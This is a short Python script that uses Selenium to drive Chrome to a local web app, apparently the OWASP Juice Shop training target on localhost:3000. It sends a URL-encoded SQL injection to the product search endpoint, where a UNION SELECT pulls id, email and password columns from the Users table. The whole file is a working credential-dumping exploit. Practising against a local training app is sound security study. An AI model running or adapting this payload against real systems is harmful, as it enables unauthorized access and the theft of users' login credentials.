import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

class SQLInjection:
    
    def __init__(self, base_url, sql_query):
        self.base_url = base_url
        self.sql_query = sql_query
        
    def run(self):
        self.chrome_options = Options()
        #no Browser window
        #self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--window-size=1480,996")
        self.driver = webdriver.Chrome(options=self.chrome_options)
        self.driver.get(self.base_url)
        time.sleep(3)
        self.driver.get(self.base_url + self.sql_query)

if __name__ == "__main__":
    
    user_cred_injection = SQLInjection(base_url="http://localhost:3000",sql_query="/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
    user_cred_injection.run()

